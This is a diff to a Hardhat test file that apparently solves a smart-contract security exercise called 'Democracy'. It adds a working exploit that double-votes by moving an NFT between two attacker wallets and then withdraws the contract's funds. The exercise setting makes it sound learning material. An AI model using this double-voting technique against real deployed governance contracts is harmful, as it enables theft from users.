@@ -8,25 +8,45 @@ const { ethers } = require("hardhat");
 
 const NAME = "Democracy";
 
-describe(NAME, function () {
+describe.only(NAME, function () {
   async function setup() {
-      const [owner, attackerWallet] = await ethers.getSigners();
+      const [owner, attackerWallet, attackerWallet2] = await ethers.getSigners();
       const value = ethers.utils.parseEther("1");
 
       const VictimFactory = await ethers.getContractFactory(NAME);
       const victimContract = await VictimFactory.deploy({ value });
 
-      return { victimContract, attackerWallet };
+      return { victimContract, attackerWallet, attackerWallet2 };
   }
 
   describe("exploit", async function () {
-      let victimContract, attackerWallet;
+      let victimContract, attackerWallet, attackerWallet2;
       before(async function () {
-          ({ victimContract, attackerWallet } = await loadFixture(setup));
+          ({ victimContract, attackerWallet, attackerWallet2 } = await loadFixture(setup));
       })
 
       it("conduct your attack here", async function () {
-          
+          // Step 1: Nominate challenger as attacker to get NFTs
+          await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
+
+          console.log("Attacker1 NFTs: ", await victimContract.balanceOf(attackerWallet.address));
+
+          // Step 2: Transfer nft to another address and vote
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 0);
+
+          console.log("Attacker2 NFTs: ", await victimContract.balanceOf(attackerWallet2.address));
+
+          await victimContract.connect(attackerWallet2).vote(attackerWallet.address);
+
+          console.log("Attacker2 voted")
+
+          // Step 3: Transfer NFT back and vote again
+          await victimContract.connect(attackerWallet2).transferFrom(attackerWallet2.address, attackerWallet.address, 0);
+
+          await victimContract.connect(attackerWallet).vote(attackerWallet.address);
+
+          // Step 4: Withdraw funds
+          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
       });
 
       after(async function () {
